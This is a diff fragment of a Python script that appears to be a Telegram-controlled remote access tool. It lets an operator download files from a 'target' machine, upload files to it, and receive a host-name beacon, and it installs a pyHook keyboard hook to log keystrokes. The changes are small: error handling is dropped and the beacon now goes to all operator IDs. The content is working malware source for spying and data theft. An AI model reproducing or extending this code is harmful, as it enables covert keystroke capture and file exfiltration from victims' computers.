@@ -140,7 +140,6 @@ def handle(msg):
 				path_file = command.replace('/download', '')
 				path_file = path_file[1:]
 				if path_file == '':
-					# bot.sendChatAction(chat_id, 'typing')
 					response = '/download C:/path/to/file.name or /download file.name'
 				else:
 					try:
@@ -195,7 +194,7 @@ def handle(msg):
 				handle(msg)
 			if response != '':
 				bot.sendMessage(chat_id, response)
-		else:# Upload a file to target
+		else: # Upload a file to target
 			file_name = msg['document']['file_name']
 			file_id = msg['document']['file_id']
 			file_path = bot.getFile(file_id=file_id)['file_path']
@@ -207,16 +206,12 @@ def handle(msg):
 bot = telepot.Bot(token)
 bot.message_loop(handle)
 if len(known_ids) > 0:
-	bot.sendMessage(known_ids[0], platform.uname()[1] + ": I'm up.")
-#print 'Listening for commands on ' + platform.uname()[1] + '...'
+	helloWorld = platform.uname()[1] + ": I'm up."
+	print helloWorld
+	for known_id in known_ids:
+		bot.sendMessage(known_id, helloWorld)
+print 'Listening for commands on ' + platform.uname()[1] + '...'
 proc = pyHook.HookManager()
-try:
-	proc.KeyDown = pressed_chars
-except:
-	sys.exit(0)
+proc.KeyDown = pressed_chars
 proc.HookKeyboard()
-try:
-	while True:
-		pythoncom.PumpMessages()
-except KeyboardInterrupt:
-	exit(0)
+pythoncom.PumpMessages()
